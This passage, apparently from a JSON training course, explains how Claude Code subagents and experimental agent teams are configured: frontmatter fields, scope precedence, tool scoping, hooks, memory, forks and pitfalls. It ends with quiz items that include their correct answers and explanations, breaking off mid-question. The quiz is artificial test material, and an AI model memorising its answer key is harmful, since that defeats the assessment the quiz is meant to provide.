No |\n\nIf a rule from your CLAUDE.md must reach Explore or Plan (for example, \"ignore the `vendor/` directory\"), restate it explicitly in the delegation prompt.\n\nBuilt-in subagents are always registered in interactive sessions. In headless and SDK mode, set `CLAUDE_AGENT_SDK_DISABLE_BUILTIN_AGENTS=1` to remove all built-in types and supply only your own."
   },
   {
    "heading": "Subagent File Format: YAML Frontmatter as Configuration Contract",
    "body": "Subagents are Markdown files. The YAML frontmatter declares all metadata and behavior tuning; the markdown body is the system prompt. Only `name` and `description` are required.\n\n```markdown\n---\nname: db-reader\ndescription: Execute read-only database queries. Use when analyzing data or generating reports.\ntools: Bash\nhooks:\n  PreToolUse:\n    - matcher: \"Bash\"\n      hooks:\n        - type: command\n          command: \"./scripts/validate-readonly-query.sh\"\n---\n\nYou are a database analyst with read-only access.\nExecute SELECT queries to answer questions about the data.\n\nWhen asked to analyze data:\n1. Identify which tables contain the relevant data\n2. Write efficient SELECT queries with appropriate filters\n3. Present results clearly with context\n\nYou cannot modify data. If asked to INSERT, UPDATE, DELETE, or modify\nschema, explain that you only have read access.\n```\n\n### Complete frontmatter field reference\n\n| Field | Required | Type | Notes |\n|---|---|---|---|\n| `name` | Yes | string | Lowercase letters and hyphens. Used as `agent_type` in hooks. Filename need not match. |\n| `description` | Yes | string | Claude reads this to decide when to delegate. Including \"use proactively\" increases automatic delegation rate. |\n| `tools` | No | comma-separated string or list | Allowlist. Omitting inherits all parent tools. `Agent(type1, type2)` syntax restricts which child subagents can be spawned when this definition runs as the main session via `--agent`. |\n| `disallowedTools` | No | comma-separated string or list | Denylist. Applied before `tools`. `mcp__<server>` removes all tools from one server. `mcp__*` removes all MCP tools from any server. |\n| `model` | No | string | `sonnet`, `opus`, `haiku`, `fable`, a full model ID (e.g. `claude-opus-4-8`), or `inherit`. Defaults to `inherit`. |\n| `permissionMode` | No | string | `default`, `acceptEdits`, `auto`, `dontAsk`, `bypassPermissions`, or `plan`. Ignored for plugin subagents. |\n| `maxTurns` | No | integer | Hard cap on agentic turns before the subagent stops. |\n| `skills` | No | list of strings | Skill names to inject at startup. Full content injected, not just description. |\n| `mcpServers` | No | list | Inline server definitions or string references to session-configured servers. Ignored for plugin subagents. |\n| `hooks` | No | object | `PreToolUse`, `PostToolUse`, `Stop` (converted to `SubagentStop` at runtime). Ignored for plugin subagents. |\n| `memory` | No | string | `user`, `project`, or `local`. Enables persistent memory directory. |\n| `background` | No | boolean | Force this subagent to always run as a background task. Default: `false`. |\n| `effort` | No | string | `low`, `medium`, `high`, `xhigh`, `max`. Overrides session effort level when this subagent runs. |\n| `isolation` | No | string | `worktree` — gives subagent its own temporary git worktree, auto-cleaned if no changes made. |\n| `color` | No | string | `red`, `blue`, `green`, `yellow`, `purple`, `orange`, `pink`, `cyan`. |\n| `initialPrompt` | No | string | Auto-submitted as first user turn when running as main session via `--agent`. Commands and skills are processed. Prepended to any user-provided prompt. |\n\n### Pitfall: `disallowedTools` vs `tools` interaction\n\nIf you set both, `disallowedTools` is applied first to the inherited pool, then the `tools` allowlist is resolved against the remaining tools. A tool appearing in both is removed. The practical implication: do not rely on `disallowedTools` as a secondary filter after setting an allowlist — just leave unwanted tools out of the `tools` list."
   },
   {
    "heading": "Definition Scope and Precedence: Where Definitions Live and Who Wins",
    "body": "Subagent definitions are discovered from five ranked scopes. When multiple definitions share the same `name`, exactly one wins based on this priority order:\n\n| Priority | Location | Scope | Typical use |\n|---|---|---|---|\n| 1 (highest) | Managed settings directory `.claude/agents/` | Organization-wide | Org-enforced tooling, security reviewers, compliance agents |\n| 2 | `--agents` CLI flag (JSON, in-memory) | Current session only | Quick testing, CI automation scripts |\n| 3 | `.claude/agents/` (project) | Current project | Team-shared, checked into version control |\n| 4 | `~/.claude/agents/` (user) | All your projects | Personal productivity agents |\n| 5 (lowest) | Plugin's `agents/` directory | Where plugin is enabled | Distributed tooling via plugin marketplaces |\n\n### CWD proximity as a tiebreaker within project scope\n\nProject scope is discovered by walking **up** from the current working directory. Every `.claude/agents/` between the cwd and the repository root is scanned. As of v2.1.178, when two files in different levels of this walk share the same `name`, the definition **closest to the cwd** wins. This is the right behavior for monorepos where a package-level agent should shadow the root-level default.\n\n### Recursive scan and subdirectory organization\n\nBoth `.claude/agents/` and `~/.claude/agents/` are scanned **recursively**. You can organize by domain:\n\n```\n.claude/agents/\n  review/\n    security.md\n    performance.md\n  research/\n    api-explorer.md\n  db-reader.md\n```\n\nThe subdirectory path does **not** affect identity or invocation — identity comes only from the `name` frontmatter field. Keep `name` values unique within a scope tree; if two files in the same scope declare the same name, Claude Code keeps one and silently discards the other.\n\n### Plugin subagent scoping is different\n\nFor plugin agents, the subfolder path **does** become part of the scoped identifier. A file at `agents/review/security.md` in plugin `my-plugin` registers as `my-plugin:review:security`. Namespace collisions within a plugin are avoided by the plugin author's directory structure.\n\n### Plugin security restrictions\n\nPlugin subagents **cannot** use `hooks`, `mcpServers`, or `permissionMode` frontmatter fields. These are silently ignored. If you need these capabilities from a plugin-provided agent, copy the file into `.claude/agents/` or `~/.claude/agents/`.\n\n### Sessions need a restart to pick up on-disk additions\n\nSubagents are loaded at session start. If you add or edit an agent file directly on disk, **restart the session** to pick it up. Agents created or edited through `/agents` take effect immediately without a restart.\n\n### Committed vs personal: what goes where\n\n| File location | Check into git? | Who sees it | Use for |\n|---|---|---|---|\n| `.claude/agents/*.md` | Yes | Whole team | Team-standard reviewers, project-specific workflows, shared CI agents |\n| `~/.claude/agents/*.md` | No (personal) | You only | Personal productivity agents, cross-project personal tooling |\n| `.claude/settings.json` `permissions.deny` | Yes | Whole team | Blocking built-in agents team-wide (e.g. `Agent(Explore)`) |\n| `.claude/settings.local.json` | No (gitignored) | You only | Personal permission overrides per project |\n\nKeep security-sensitive agents (those with `bypassPermissions`, production database access, or broad `Bash` tools) out of version control unless the whole team should have them and understands the risk."
   },
   {
    "heading": "Tool and Context Scoping: Minimum Capability by Design",
    "body": "The single biggest operational mistake teams make with subagents is letting them inherit all tools from the parent. Every tool you leave enabled is a capability the subagent can exercise, a permission prompt it can trigger, and a context-bloating tool description sent on every request. The right posture is: **grant only what the task requires**.\n\n### Allowlists vs denylists\n\nUse `tools` (allowlist) when you know the exact set of tools needed. This is the safest pattern:\n\n```yaml\n---\nname: code-reviewer\ntools: Read, Grep, Glob, Bash\n---\n```\n\nThis agent cannot write files, cannot edit files, cannot use MCP tools. Any attempt is blocked immediately.\n\nUse `disallowedTools` (denylist) when you want to inherit most tools and carve out exceptions:\n\n```yaml\n---\nname: no-writes\ndisallowedTools: Write, Edit\n---\n```\n\nThis inherits everything except Write and Edit — including Bash (which can still write files via shell). Use with care.\n\nNote: four tools are never available to subagents regardless of your `tools` field: `AskUserQuestion`, `EnterPlanMode`, `ExitPlanMode` (unless `permissionMode: plan`), and `ScheduleWakeup`. These depend on the main session's UI state.\n\n### MCP server-level patterns\n\nBoth fields accept server-level patterns in addition to exact tool names:\n\n```yaml\n# Allow only tools from the 'db' server\ntools: mcp__db\n\n# Inherit everything except tools from the github MCP server\ndisallowedTools: mcp__github\n\n# Inherit built-ins, block every MCP tool from any server\ndisallowedTools: mcp__*\n```\n\nNote: the pattern `mcp__<server>` (without the `__*` suffix) also removes all tools from the named server and is equivalent to `mcp__<server>__*` in `disallowedTools`.\n\n### Inline MCP servers: keeping tool descriptions out of main context\n\nWhen you add an MCP server to `.mcp.json`, its tool descriptions load into **every** conversation's context. For a server used only by one specialized subagent, this is pure waste. Define it inline instead:\n\n```yaml\n---\nname: browser-tester\ndescription: Tests features in a real browser using Playwright\nmcpServers:\n  - playwright:\n      type: stdio\n      command: npx\n      args: [\"-y\", \"@playwright/mcp@latest\"]\n  - github  # string reference: reuses an already-configured session server\n---\n\nUse the Playwright tools to navigate, screenshot, and interact with pages.\n```\n\nThe Playwright server connects when the subagent spawns and disconnects when it finishes. The main conversation never sees the Playwright tool descriptions. This is the right architecture for any high-tool-count MCP server that only one agent needs.\n\n### Hooks for sub-tool-call gating\n\nThe `tools` allowlist operates at the tool level. When you need to block specific operations **within** a tool (for example, allow `Bash` but block SQL writes), use a `PreToolUse` hook:\n\n```yaml\nhooks:\n  PreToolUse:\n    - matcher: \"Bash\"\n      hooks:\n        - type: command\n          command: \"./scripts/validate-readonly-query.sh\"\n```\n\nClaude Code passes full tool input as JSON on stdin to hook commands. Exit code 2 blocks the call and sends stderr back to the agent as feedback:\n\n```bash\n#!/bin/bash\nINPUT=$(cat)\nCOMMAND=$(echo \"$INPUT\" | jq -r '.tool_input.command // empty')\nif echo \"$COMMAND\" | grep -iE '\\b(INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE)\\b' > /dev/null; then\n  echo \"Blocked: Only SELECT queries are allowed\" >&2\n  exit 2\nfi\nexit 0\n```\n\nThis is the right place for enforcement that must hold regardless of how the agent reasons — you cannot rely on system prompt instructions alone for security-critical restrictions.\n\n### Spawning depth and nested subagent restrictions\n\nAs of Claude Code v2.1.172, subagents can spawn their own subagents. Depth is counted as the number of subagent levels below the main conversation. A subagent at depth five does not receive the Agent tool and cannot spawn further — this limit is fixed. To prevent a specific subagent from spawning any children, omit `Agent` from its `tools` list or add it to `disallowedTools`.\n\nThe `Agent(type1, type2)` allowlist syntax in the `tools` field is honored **only when the definition runs as the main session thread** (via `claude --agent`). When the same definition runs as a subagent spawned by another agent, any type list inside the parentheses is ignored — but including `Agent` in the `tools` field still controls whether nesting is allowed at all."
   },
   {
    "heading": "Fork vs Fresh Subagent: When to Inherit the Conversation",
    "body": "A **fork** is a subagent variant that inherits the entire current conversation rather than starting fresh. It is the right tool when a normal subagent would need expensive re-explanation of context the main conversation already has.\n\n### Mechanical differences\n\n| | Fork | Named subagent |\n|---|---|---|\n| Context at spawn | Full parent conversation history | Fresh: system prompt + delegation task only |\n| System prompt and tools | Identical to parent session | From the subagent's definition file |\n| Model | Same as parent | Resolved per model resolution order |\n| Prompt cache | **Shared with parent** — first request reuses parent's cache | Separate cache |\n| Can spawn another fork | No | Yes (can spawn subagents) |\n| Worktree support | Yes (pass `isolation: \"worktree\"` via Agent tool) | Yes (`isolation: worktree` in frontmatter) |\n\n### Invoking a fork\n\nForks require Claude Code v2.1.117+. From v2.1.161, the `/fork` command is enabled by default. On earlier versions, set `CLAUDE_CODE_FORK_SUBAGENT=1` to enable it.\n\n```\n/fork draft unit tests for the parser changes so far\n```\n\nThe fork appears in a panel below the prompt and runs in the background. Its final result returns to the main conversation. You can keep working in the main session while the fork runs.\n\n### Fork mode changes behavior session-wide\n\nSetting `CLAUDE_CODE_FORK_SUBAGENT=1` (or enabling it via rollout) changes two things:\n1. Claude can spawn a fork by requesting the `fork` subagent type explicitly.\n2. **Every** subagent spawn (not just forks) runs in the background.\n\nIf you need subagents to run synchronously, also set `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1`. Set `CLAUDE_CODE_FORK_SUBAGENT=0` to disable fork mode entirely, including any server-side rollout.\n\n### When to use each\n\n**Use a fork when:**\n- The side task needs the full context of what has been discussed so far\n- You want to try two approaches from the same starting point in parallel\n- You care about reusing the prompt cache (forks reuse the parent cache on the first request)\n\n**Use a fresh subagent when:**\n- The task is self-contained and can be fully specified in a delegation prompt\n- You want to enforce a different tool set or model for the worker\n- You want strict isolation — the worker should not be influenced by the main conversation's history"
   },
   {
    "heading": "Model Selection and Effort: Routing Work to the Right Tier",
    "body": "Every subagent can run on a different model, and the model resolution order matters for team-wide infrastructure.\n\n### Model resolution order\n\nClaude Code resolves a subagent's model in this order:\n\n1. `CLAUDE_CODE_SUBAGENT_MODEL` environment variable (session-wide override for all subagents and agent teams)\n2. Per-invocation `model` parameter (set by Claude when it delegates)\n3. The subagent definition's `model` frontmatter field\n4. The main conversation's model (the `inherit` default)\n\nFor a team deployment, `CLAUDE_CODE_SUBAGENT_MODEL` in the environment (or `settings.json` via `env:`) is the right lever to route all subagent work to a specific model tier regardless of what individual definition files say. Setting it to `inherit` restores normal per-definition resolution.\n\n### Model aliases\n\nUse aliases to stay version-independent: `haiku`, `sonnet`, `opus`, `fable`, or `inherit`. You can also specify a full model ID like `claude-opus-4-8` to pin to a specific version.\n\n### Right-sizing subagents\n\n| Task type | Recommended model | Rationale |\n|---|---|---|\n| File search, codebase exploration | `haiku` | Fast, cheap, read-only — throughput matters more than deep reasoning |\n| Code review, analysis | `sonnet` | Balances capability and speed for pattern recognition |\n| Complex architecture, multi-file edits | `inherit` or `opus` | Needs full reasoning capacity |\n| Data analysis, SQL generation | `sonnet` | Sufficient for structured output; no need for full capacity |\n\n### Effort level\n\nThe `effort` field overrides the session's effort level for this subagent:\n\n```yaml\neffort: low   # Fastest, cheapest\neffort: high  # More thorough reasoning\n```\n\nAvailable levels are `low`, `medium`, `high`, `xhigh`, and `max`, though which levels a given model supports depends on the model. Use `low` for high-volume simple lookups. Effort affects latency and cost per turn — do not set it higher than the task requires."
   },
   {
    "heading": "Persistent Memory: Subagents That Learn Across Conversations",
    "body": "A subagent with `memory:` set gets a persistent directory that survives between sessions. The subagent uses it to accumulate institutional knowledge: codebase patterns, recurring issues, architectural decisions, and debugging insights.\n\n### Memory scopes\n\n| Scope | Location | Check into git? | Use when |\n|---|---|---|---|\n| `user` | `~/.claude/agent-memory/<agent-name>/` | No | Knowledge applies across all projects (e.g., a personal code-quality agent) |\n| `project` | `.claude/agent-memory/<agent-name>/` | Yes (recommended default) | Knowledge is project-specific and teammates should share it |\n| `local` | `.claude/agent-memory-local/<agent-name>/` | No (gitignored) | Project-specific but should not be committed (e.g., contains paths or env-specific notes) |\n\n### What enabling memory does\n\nWhen `memory:` is set, Claude Code automatically:\n- Adds instructions to the subagent's system prompt for reading and writing the memory directory\n- Injects the first 200 lines or 25 KB of `MEMORY.md` in that directory into the subagent's context at startup (whichever limit is hit first)\n- Enables the `Read`, `Write`, and `Edit` tools for the subagent even if they are not listed in `tools:` — memory maintenance requires them\n\n### Making memory productive\n\n```markdown\n---\nname: code-reviewer\ndescription: Reviews code for quality and best practices\nmemory: project\n---\n\nYou are a code reviewer. As you work:\n- Before starting, read your agent memory for patterns relevant to this codebase.\n- After completing each review, update MEMORY.md with:\n  - Recurring patterns you noticed (good and bad)\n  - Architectural conventions you discovered\n  - Common mistakes the team makes\n  - Files and modules worth noting for future reviews\n\nKeep MEMORY.md under 200 lines. Curate it: remove stale entries,\ncombine related observations.\n```\n\nThe key operational pattern: **ask the subagent to consult memory before starting, and update memory after finishing**. Without explicit instructions in the system prompt, agents may not use memory consistently.\n\n### Pitfall: memory and tool allowlists\n\nIf you set a restrictive `tools:` allowlist that excludes `Write` and `Edit`, but also set `memory:`, Claude Code re-enables those tools for memory operations regardless. If you need to prevent all writes (including memory writes), do not use `memory:` on that subagent."
   },
   {
    "heading": "Agent Teams: Architecture and When to Reach for Them",
    "body": "Agent teams are an **experimental** feature that coordinates multiple independent Claude Code sessions. One session acts as the team lead; others are teammates who share a task list, claim work independently, and communicate peer-to-peer.\n\n### Enabling teams\n\n```json\n// .claude/settings.json\n{\n  \"env\": {\n    \"CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS\": \"1\"\n  }\n}\n```\n\nOr set the environment variable in your shell before launching. Without this variable, no team is set up, no team directories are written, and Claude will not spawn or propose teammates.\n\n### When teams genuinely add value\n\nAgent teams cost proportionally more tokens — every teammate is a full independent Claude instance with its own context window. Justify this cost only when:\n\n- **Workers need to challenge each other's conclusions.** Teammates can send messages peer-to-peer, reject each other's hypotheses, and converge through debate. Subagents cannot do this.\n- **The task decomposes into genuinely parallel, independently owned pieces.** Three teammates each owning a different module is the canonical example.\n- **The total work exceeds what fits comfortably in a single context window.** Each teammate has its own context budget.\n\n### What teams are not good for\n\n- Sequential tasks (coordination overhead exceeds the benefit)\n- Same-file edits (two teammates editing the same file leads to overwrites — there is no merge mechanism)\n- Tasks with many inter-dependencies between subtasks\n- Any situation where experimental limitations are unacceptable\n\n### Architecture overview\n\n| Component | Role |\n|---|---|\n| **Team lead** | The main Claude Code session that spawns teammates and coordinates work |\n| **Teammates** | Separate Claude Code instances, each working on assigned tasks |\n| **Task list** | Shared work items stored at `~/.claude/tasks/{team-name}/`; persists after session end |\n| **Mailbox** | Messaging system for direct peer-to-peer communication between agents |\n\nThe team name is `session-` followed by the first eight characters of the session ID. Team config is stored at `~/.claude/teams/{team-name}/config.json` and is removed automatically when the session ends. Do not hand-edit the config — it is overwritten on every state update.\n\n### Practical team size guidance\n\nStart with 3–5 teammates. Token costs scale linearly with teammate count. Having 5–6 tasks per teammate keeps everyone productive. If you have 15 independent tasks, 3 teammates is the right starting point."
   },
   {
    "heading": "Teammate Context, Permissions, and the Spawn Prompt",
    "body": "Understanding exactly what a teammate does and does not see is critical for writing spawn prompts that work.\n\n### What a teammate loads at spawn\n\n- CLAUDE.md files (all levels — managed, user, project, local)\n- MCP servers configured for the project or user\n- Skills (from project and user settings)\n- The spawn prompt from the lead\n\n### What a teammate does NOT receive\n\n- The lead's conversation history\n- Skills the lead has already invoked in its session\n- Files the lead has already read\n- The lead's model selection (by default)\n\n**Operational consequence:** The lead's accumulated context is invisible to teammates. Every piece of task-specific information the teammate needs must be in the spawn prompt. This is the single most common failure mode for agent teams.\n\n### Model selection for teammates\n\nTeammates do not inherit the lead's model selection by default. To change the default model used for teammates when the spawn prompt does not specify one, set **Default teammate model** in `/config`, choosing **Default (leader's model)** to follow the lead's current model. You can also specify it explicitly in the spawn instruction: \"Spawn 4 teammates using Sonnet.\"\n\n### Permissions\n\nTeammates start with the lead's permission settings:\n- If the lead runs with `--dangerously-skip-permissions`, all teammates do too\n- You can change individual teammate modes after spawning, but you cannot set per-teammate modes at spawn time\n- Pre-approve common operations in your permission settings before spawning to reduce permission prompts bubbling up during team execution\n\n### Using subagent definitions as teammate blueprints\n\nYou can reference any subagent definition from any scope when spawning a teammate:\n\n```\nSpawn a teammate using the security-reviewer agent type to audit the auth module.\n```\n\nThe teammate honors the definition's `tools` allowlist and `model`, and the definition body is **appended** to the teammate's system prompt as additional instructions — not replacing it. Team coordination tools (`SendMessage`, task management tools) are always available to a teammate even when `tools` restricts other tools.\n\n**Important limitations when a subagent definition runs as a teammate:**\n- `skills:` frontmatter is **not** applied — teammates load skills from project and user settings, not from the definition file\n- `mcpServers:` frontmatter is **not** applied — teammates use session MCP configuration\n\n### Writing effective spawn prompts\n\nBecause teammates start without the lead's history, spawn prompts must be self-contained:\n\n```\nSpawn a security reviewer teammate with the prompt: \"Review the authentication\nmodule at src/auth/ for security vulnerabilities. Focus on token handling,\nsession management, and input validation. The app uses JWT tokens stored in\nhttpOnly cookies. All tokens expire after 24 hours. Report issues with\nseverity ratings: Critical, High, Medium, Low.\"\n```\n\nCompare with the failure mode — a spawn prompt that assumes shared context:\n\n```\n# Bad: assumes teammate knows what we discussed\nSpawn a security reviewer to look at what we just talked about.\n```"
   },
   {
    "heading": "Task Coordination and Quality Gating",
    "body": "The shared task list is the coordination primitive for agent teams. Understanding its mechanics prevents the failure modes that cause wasted parallel work.\n\n### Task list mechanics\n\n- Tasks have three states: **pending**, **in progress**, **completed**\n- Tasks can declare dependencies on other tasks — a pending task with unresolved dependencies cannot be claimed until those dependencies complete\n- **File locking** prevents race conditions when multiple teammates try to claim the same task simultaneously\n- The lead creates tasks and can assign them explicitly, or teammates **self-claim** after finishing their current work\n- Dependency resolution is automatic: when a task completes, blocked tasks unlock without manual intervention\n\nThe task list is stored at `~/.claude/tasks/{team-name}/` (where the team name is `session-` + the first 8 characters of the session ID). It persists after session end — resumed sessions keep their tasks. Cleanup is governed by the `cleanupPeriodDays` setting (same as session transcripts).\n\n### Plan approval workflow\n\nFor complex or risky tasks, require plan approval before a teammate starts making changes:\n\n```\nSpawn an architect teammate to refactor the authentication module.\nRequire plan approval before they make any changes.\n```\n\nThe teammate works in read-only plan mode until the lead approves. The lead can:\n- **Approve** — teammate exits plan mode and begins implementation\n- **Reject with feedback** — teammate revises and resubmits\n\nThe lead makes approval decisions autonomously. Specify criteria in the spawn instruction to influence its judgment: \"only approve plans that include test coverage\" or \"reject any plan that modifies the database schema.\"\n\n### Quality gating with hooks\n\nThree hook events are available for quality enforcement in agent teams:\n\n| Hook event | When it fires | Exit code 2 behavior |\n|---|---|---|\n| `TeammateIdle` | When a teammate is about to go idle | Send feedback, keep teammate working |\n| `TaskCreated` | When a task is being created | Prevent creation, send feedback |\n| `TaskCompleted` | When a task is being marked complete | Prevent completion, send feedback |\n\n`TaskCompleted` with exit code 2 is the most powerful gate. Use it to enforce a quality bar before work is considered done:\n\n```json\n// .claude/settings.json\n{\n  \"hooks\": {\n    \"TaskCompleted\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"./scripts/verify-task-quality.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nThe verification script receives task details via stdin, runs checks (linting, type checking, test execution), and exits 2 with feedback if quality is insufficient. The teammate must address the feedback before the task can be marked complete.\n\n### Communication mechanics\n\n- **Automatic delivery**: messages between agents are delivered automatically; the lead does not need to poll\n- **Idle notifications**: when a teammate finishes and stops, it automatically notifies the lead\n- **Targeted messaging**: teammates message each other by name (one recipient per message — there is no broadcast)\n- **Teammate discovery**: teammates can read `~/.claude/teams/{team-name}/config.json`, which contains a `members` array with each teammate's name, agent ID, and agent type\n\n### Display modes\n\nSet `teammateMode` in `~/.claude/settings.json` to control how teammates appear:\n\n```json\n{\n  \"teammateMode\": \"auto\"\n}\n```\n\nOr per-session: `claude --teammate-mode auto`\n\n| Mode | Behavior | Requirements |\n|---|---|---|\n| `in-process` **(default)** | All teammates in your main terminal; arrow keys to navigate; Enter to open | Any terminal |\n| `auto` | Split panes if inside a tmux session or iTerm2 is detected, else in-process | tmux or iTerm2 |\n| `tmux` | Split panes, auto-detects tmux or iTerm2 | tmux or iTerm2 |\n| `iterm2` | iTerm2 native split panes explicitly | `it2` CLI, iTerm2 Python API enabled |\n\nNote: the default changed from `auto` to `in-process` in v2.1.179. If you previously relied on automatic split-pane behavior, set `\"teammateMode\": \"auto\"` explicitly."
   },
   {
    "heading": "Operational Patterns: From First Subagent to Production Team Setup",
    "body": "This section covers the concrete files and commands for a team deploying shared subagent infrastructure across multiple projects.\n\n### Team-shared subagents via version control\n\nThe canonical setup is project-level agents in `.claude/agents/`, checked into git:\n\n```\n.claude/\n  agents/\n    review/\n      security.md      # Security-focused read-only reviewer\n      performance.md   # Performance analysis agent\n    workers/\n      db-reader.md     # Read-only DB query executor with hook validation\n      test-runner.md   # Runs tests, returns only failures\n  settings.json\n```\n\nEvery team member who clones the repo gets the same agents automatically at session start.\n\n### Disabling built-in agents team-wide\n\nTo prevent Claude from auto-delegating to the built-in Explore agent (for example, your workflow always wants full context in the main conversation):\n\n```json\n// .claude/settings.json\n{\n  \"permissions\": {\n    \"deny\": [\"Agent(Explore)\"]\n  }\n}\n```\n\nYou can also pass `--disallowedTools \"Agent(Explore)\"` as a CLI flag for a single session.\n\n### Invoking subagents from CI/headless mode\n\n```bash\n# Disable built-in agents (only applies in non-interactive/SDK mode)\n# and supply only your own via --agents\nCLAUDE_AGENT_SDK_DISABLE_BUILTIN_AGENTS=1 claude --agents '{\n  \"code-reviewer\": {\n    \"description\": \"Expert code reviewer. Use proactively after code changes.\",\n    \"prompt\": \"You are a senior code reviewer. Focus on code quality, security, and best practices.\",\n    \"tools\": [\"Read\", \"Grep\", \"Glob\", \"Bash\"],\n    \"model\": \"sonnet\"\n  }\n}' -p \"Review the diff from the last commit and report any issues.\"\n```\n\nCLI-defined agents via `--agents` are not saved to disk and exist only for the session — correct for CI where you want no local state. The `--agents` flag accepts the same frontmatter fields as file-based subagents, using `prompt` in place of the markdown body.\n\n### Making a session permanently adopt an agent's persona\n\n```bash\nclaude --agent security-reviewer\n```\n\nThe subagent's system prompt **replaces** the default Claude Code system prompt for the entire session. CLAUDE.md files still load through the normal message flow. To make it the default for every session in a project:\n\n```json\n// .claude/settings.json\n{\n  \"agent\": \"security-reviewer\"\n}\n```\n\n### Resuming subagents\n\nEach subagent invocation creates a new instance by default. To continue an existing subagent's work, ask Claude to resume it:\n\n```\nContinue that code review and now analyze the authorization logic\n```\n\nClaude uses `SendMessage` with the agent's ID to resume it. Subagent transcripts live at:\n\n```\n~/.claude/projects/{project}/{sessionId}/subagents/agent-{agentId}.jsonl\n```\n\nBuilt-in Explore and Plan agents are one-shot and return no agent ID, so they cannot be resumed. Use `general-purpose` or a custom subagent when you need resumability.\n\n### Managing session-level background behavior\n\n| Env var | Effect |\n|---|---|\n| `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1` | Force all subagent spawns synchronous (foreground) |\n| `CLAUDE_CODE_FORK_SUBAGENT=1` | Enable fork mode (and force all spawns to background) |\n| `CLAUDE_CODE_FORK_SUBAGENT=0` | Disable fork mode, including any server-side rollout |\n| `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` | Enable experimental agent teams |\n| `CLAUDE_CODE_SUBAGENT_MODEL=haiku` | Route all subagent and team work to this model |\n| `CLAUDE_AGENT_SDK_DISABLE_BUILTIN_AGENTS=1` | Remove all built-in agents in headless/SDK mode only |"
   },
   {
    "heading": "Common Pitfalls, Gotchas, and Failure Modes",
    "body": "### Subagent pitfalls\n\n**1. Silent name collision within a scope.** If two files in `.claude/agents/` (recursively) declare the same `name`, Claude Code keeps one and discards the other without warning. Keep `name` values globally unique within each scope tree. The filename does not have to match the `name` field — this makes it easy to have `agents/review/security.md` with `name: security-reviewer` and `agents/workers/security.md` with `name: security-worker`.\n\n**2. Assuming subagents see conversation history.** The most common bug in subagent prompts. The agent starts from zero knowledge of what the parent discussed. Always write delegation prompts that are fully self-contained.\n\n**3. `memory:` re-enables Write/Edit.** If you set a strict `tools:` allowlist excluding Write and Edit for security reasons but also set `memory:`, those tools are re-enabled for memory maintenance. Do not combine `memory:` with security-critical write restrictions.\n\n**4. On-disk edits require session restart.** Subagents are loaded at session start. Adding a file to `.claude/agents/` while a session is running has no effect until restart. Use `/agents` for live edits.\n\n**5. `bypassPermissions` scope.** When set on a subagent, it skips permission prompts for writes to directories including `.git`, `.claude`, `.config/git`, `.vscode`, `.idea`, `.husky`, `.cargo`, `.devcontainer`, `.yarn`, and `.mvn`. Reserve it for hermetic worktree-isolated subagents only.\n\n**6. Plugin subagents ignore security-sensitive frontmatter.** `hooks`, `mcpServers`, and `permissionMode` are silently ignored in plugin subagents. A plugin cannot self-escalate permissions through these fields.\n\n**7. Four tools are always unavailable to subagents.** `AskUserQuestion`, `EnterPlanMode`, `ExitPlanMode` (unless `permissionMode: plan`), and `ScheduleWakeup` depend on the main session's UI state. Listing them in `tools:` has no effect.\n\n### Agent team pitfalls\n\n**8. No session resumption for in-process teammates.** `/resume` and `/rewind` do not restore in-process teammates. If you resume a session, the lead may try to message teammates that no longer exist. Tell the lead to spawn new teammates.\n\n**9. Task status lag.** Teammates sometimes fail to mark tasks as completed, blocking dependent tasks. Monitor task status and nudge teammates manually if a task appears stuck.\n\n**10. Lead starting work instead of delegating.** The lead may begin implementing tasks itself instead of waiting for teammates. Tell it explicitly: \"Wait for your teammates to complete their tasks before proceeding.\"\n\n**11. Teammates editing the same file.** There is no merge mechanism. Two teammates editing the same file will overwrite each other. Decompose the work so each teammate owns a disjoint set of files.\n\n**12. `skills:` and `mcpServers:` not applied in team context.** When a subagent definition runs as a teammate, these two frontmatter fields are ignored. Teammates load skills and MCP from session config. Do not rely on subagent frontmatter to configure teammate tool access for these.\n\n**13. Team config is ephemeral; task list persists.** The `~/.claude/teams/` config directory is removed when the session ends. The `~/.claude/tasks/` task list persists. Do not hand-edit the team config — it is overwritten on every state update.\n\n**14. `teammateMode` default changed in v2.1.179.** The default changed from `auto` (split panes when possible) to `in-process`. If your team relied on automatic split-pane behavior after upgrading, set `\"teammateMode\": \"auto\"` explicitly in `~/.claude/settings.json`."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team creates a subagent file at `.claude/agents/reviewer.md` and also has one at `~/.claude/agents/reviewer.md` (a user-scoped default). Both have `name: reviewer`. Which definition wins when you invoke the reviewer from a project directory?",
    "options": [
     "The user-scoped one (~/.claude/agents/) wins because user settings take higher priority than project settings",
     "The project-scoped one (.claude/agents/) wins because project definitions take precedence over user-scoped ones",
     "Claude merges both definitions, with the project file overriding conflicting fields",
     "Whichever file was modified more recently wins"
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "Project-scoped definitions (priority 3) override user-scoped ones (priority 4). The precedence order is: managed settings > --agents CLI flag > project > user > plugin. On name collision the higher-priority scope wins outright; there is no merging."
   },
   {
    "prompt": "You write a subagent with `tools: [Read, Glob]` and `disallowedTools: [Read]`. What tools does the subagent actually have access to?",
    "options": [
     "Read and Glob, because the tools allowlist overrides the denylist",
     "Only Glob, because disallowedTools is applied first and then tools resolves against the remainder",
     "No tools at all, because conflicting tool configs cancel each other out",
     "All tools, because specifying both fields is invalid and Claude falls back to inheriting everything"
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "When both fields are set, disallowedTools applies first, then tools resolves against what remains. A tool in both lists ends up removed. So Read is denied first, leaving only Glob available."
   },
   {
    "prompt": "You delegate a task to the built-in Explore subagent with a note that says 'ignore vendor/ in your search'. The task requires Explore to respect a CLAUDE.md rule that says 'always skip vendor/'. What actually happens?",
    "options": [
     "Explore loads CLAUDE.md automatically, so the rule is enforced without any extra work",
     "Explore skips CLAUDE.md entirely — you must restate critical rules like 'ignore vendor/' directly in the delegation prompt",
     "Explore loads CLAUDE.md but only the first 200 lines, so long files may miss the rule",
     "Explore inherits CLAUDE.md rules but ignores them by default unless you set permissionMode: plan"
    ],
    "correct": 1,
